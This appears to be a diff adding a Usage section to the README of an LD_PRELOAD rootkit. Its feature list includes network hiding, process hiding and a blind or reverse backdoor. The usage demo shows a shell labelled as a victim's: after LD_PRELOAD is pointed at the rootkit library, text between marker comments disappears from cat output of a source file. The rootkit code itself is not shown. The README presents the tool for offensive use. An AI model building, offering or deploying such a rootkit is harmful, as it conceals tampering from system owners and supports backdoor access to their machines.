@@ -10,3 +10,30 @@ LD_PRELOAD rootkit
 - [ ] Network hiding
 - [ ] Process hiding
 - [ ] backdoor (blind / reverse)
+
+## Usage
+### File content tampering
+Hide file contents by using tags.
+
+Real file:
+```
+[victim:~]$ cat test.c                                                                                                                   
+#include <stdio.h>
+int main(){
+	//obfuscate_start
+	printf("this is code");
+	//obfuscate_stop
+	return 0;
+}
+
+```
+
+Tampered file:
+```
+[victim:~]$ export LD_PRELOAD=./libjakshoo.so                                                                                               
+[victim:~]$ cat test.c                                                                                                                     
+#include <stdio.h>
+int main(){
+	return 0;
+}
+```
